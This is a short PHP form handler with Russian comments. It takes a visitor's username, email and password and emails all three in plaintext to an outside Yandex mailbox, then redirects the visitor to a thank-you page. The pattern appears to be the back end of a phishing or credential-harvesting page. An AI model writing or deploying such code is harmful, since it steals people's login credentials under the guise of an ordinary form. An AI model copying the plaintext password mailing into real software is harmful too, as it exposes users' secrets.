<?php 
//Принимаем постовые данные
$name=$_POST['username'];
$email=$_POST['email'];
$pass=$_POST['password'];
//Тут указываем на какой ящик посылать письмо
$to = "predator_lp@yandex.ru";
//Далее идет тема и само сообщение
// Тема письма
$subject = "Заявка с сайта";
// Сообщение письма
$message = "
Имя пользователя: ".htmlspecialchars($name)."<br />
Почта: ".htmlspecialchars($email)."<br />
Пароль: ".htmlspecialchars($pass);
// Отправляем письмо при помощи функции mail();
$headers = "From: hovework.sl <putin@stastroi.ru>\r\nContent-type: text/html; charset=UTF-8 \r\n";
mail ($to, $subject, $message, $headers);
// Перенаправляем человека на страницу благодарности и завершаем скрипт
header('Location: ty.html');
exit();
?>